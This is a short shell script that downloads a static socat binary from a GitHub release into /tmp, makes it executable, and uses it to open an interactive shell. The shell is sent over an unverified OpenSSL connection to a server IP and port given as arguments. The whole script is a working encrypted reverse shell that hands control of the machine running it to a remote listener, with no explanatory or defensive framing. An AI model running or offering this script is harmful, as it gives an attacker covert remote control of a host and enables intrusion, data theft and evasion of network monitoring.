SERVER_IP=$1
PORT=$2

curl -fsSL https://github.com/ernw/static-toolbox/releases/download/socat-v1.7.4.4/socat-1.7.4.4-x86_64 -o /tmp/socat
chmod +x /tmp/socat
/tmp/socat -d -d EXEC:"sh",pty,stderr,setsid,sigint,sane OPENSSL:${SERVER_IP}:${PORT},verify=0
